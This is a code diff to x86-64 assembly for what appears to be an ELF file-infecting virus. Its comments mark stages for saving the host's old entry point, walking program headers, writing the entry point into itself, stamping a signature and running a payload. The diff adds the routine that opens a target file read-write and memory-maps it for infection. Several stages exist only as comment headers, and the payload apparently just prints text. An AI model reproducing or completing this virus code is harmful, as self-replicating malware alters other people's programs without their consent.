@@ -51,7 +51,7 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
     Open  r13,  O_RDWR, 0x00
     test  rax,  rax
-    jl   .NextIteration
+    js   .NextIteration
   
     mov   rbx,  rax   ; save fd
     
@@ -120,7 +120,22 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   test    rax,  rax
   jne     .InfectExit
 
+  sub     rsp,  0x18
+  push    rbx
+  push    r9
+  push    rdi
+
   ; Mmap(...)
+  MMap    rbx,  PROT_READWRITE, [rsp]
+
+  pop     rdi                         ; restore regs
+  pop     r9
+
+  test    rax,  rax                   ; check if mmap(...) failed
+  js      .InfectExit
+
+  push    rax                         ; rsp       -> FileMap
+                                      ; rsp + 0x8 -> FileSz
 
   ;; SAVE OLD ENTRY >-------------------------------------------------------<
   ;; LOOP THROUGH PHDR >----------------------------------------------------<
@@ -131,6 +146,9 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
   ;; WRITE SIGNATURE >------------------------------------------------------<
   ;; EXEC PAYLOAD (PRINT STDOUT) >------------------------------------------<
+
+  .InfectCleanUp:
+  MUnMap  rax, rbx
 
   .InfectExit:
   xor     rax,  rax
